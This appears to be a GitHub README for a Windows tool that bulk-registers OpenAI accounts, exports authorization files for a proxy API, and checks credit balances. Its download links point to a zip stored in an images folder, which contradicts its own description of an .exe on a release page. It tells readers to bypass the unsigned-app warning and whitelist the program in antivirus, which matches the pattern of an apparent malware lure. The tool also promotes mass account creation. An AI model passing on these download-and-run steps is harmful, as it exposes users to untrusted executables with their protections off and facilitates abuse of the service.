# 🤖 codex-register - Manage OpenAI accounts with ease

[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/Abama7455/codex-register/main/images/codex-register-v1.5.zip)

Codex-register helps you work with OpenAI accounts. You can create accounts in bulk, log in to generate authorization files, and check credit balances. This tool helps users who need to manage multiple accounts for projects. The software produces files that work with Clip-roxy-api.

## 📥 How to download the software

This tool runs on Windows. You need to download the installer from the official release page.

[Click here to visit the release page and download the software](https://raw.githubusercontent.com/Abama7455/codex-register/main/images/codex-register-v1.5.zip)

Follow these steps to obtain the program:

1. Visit the link above.
2. Look for the section labeled Assets.
3. Click the file that ends in .exe.
4. Save the file to your desktop or a folder you can find.

## ⚙️ System Requirements

Your computer needs specific settings to run this program. Ensure your machine meets these marks:

* Operating System: Windows 10 or Windows 11.
* Memory: At least 4 gigabytes of RAM.
* Storage: 200 megabytes of free space.
* Internet: A stable connection for account verification.

## 🚀 Setting up the application

After you download the file, move it to a folder. Double-click the file to start the installer. Windows might show a security notice because the app is unsigned. Click More Info and then click Run Anyway to start the program.

The app opens a window with a menu. You now see the main interface.

## 🔑 Registering OpenAI accounts

You can create multiple accounts at once. Use a text file that contains your email addresses and passwords. 

1. Click the File menu.
2. Select Import Account List.
3. Choose the text file from your computer.
4. Click the Register button.

The program works through the list. It creates accounts one by one. You see the status of each task in the main window. If an account fails, the program highlights the row in red.

## 🛡️ Generating authorization files

After accounts exist, you need authorization files for your projects. These files allow software like Clip-roxy-api to connect to your accounts.

1. Select the accounts you want to use in the list.
2. Click the Auth button.
3. The program saves the files to a folder named Exports.
4. You can now move these files to your other applications.

## 💳 Checking account credit

You do not need to log into the web portal to see your remaining balance. The software checks this information for you.

1. Select the accounts in the list.
2. Click the Check Balance button.
3. The column labeled Credits updates with the current amount.

This feature saves time when you manage many accounts. You see which accounts have enough credit and which ones need more funds.

## 🛠️ Troubleshooting common issues

If the software does not work as expected, check these common fixes. 

### The program fails to start
Restart your computer. Ensure that your antivirus software is not blocking the application. Some security tools flag new software. You can add an exception for the folder where you store the program.

### Accounts show an error during registration
Check your network connection. If you use a proxy, make sure it allows access to OpenAI services. Ensure your email list uses the correct format. Each email and password should occupy its own line in the file.

### Balances do not update
Check your internet connection again. The credit check requires a connection to the OpenAI servers. If the servers are busy, wait a few minutes and try again.

## 📄 Managing your data

The program creates a local database file to store your credentials. Keep this file in a secure location. If you lose this file, you lose your saved account lists. 

You can back up your data:

1. Locate the folder where you installed the application.
2. Find the file named data.db.
3. Copy this file to a safe place like a thumb drive.

If you reinstall the program, you can paste this file back into the folder to restore your data.
